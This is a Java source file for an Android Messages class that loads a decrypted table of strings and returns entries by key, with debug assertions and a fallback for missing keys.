package com.android.networking;

import java.util.HashMap;
import java.util.MissingResourceException;

import android.content.Context;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class Messages {
	private static final String TAG = "Messages"; //$NON-NLS-1$

	private static HashMap<String, String> messages;
	private static boolean initialized;

	private static MessagesDecrypt md;

	private Messages() {
	}

	public synchronized static void init(Context context) {
		md = new MessagesDecrypt(context);
		messages = md.getMessages();
		initialized = messages!=null;
			
	}

	public static String getString(String key) {
		if (!initialized) {
			init(Status.getAppContext());
		}
		
		try {
			if (Cfg.DEBUG) {
				Check.asserts(messages.containsKey(key), "no key known: " + key); //$NON-NLS-1$
			}
			
			String str = messages.get(key);
			return str;
		} catch (MissingResourceException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return '!' + key + '!';
		}
	}

}
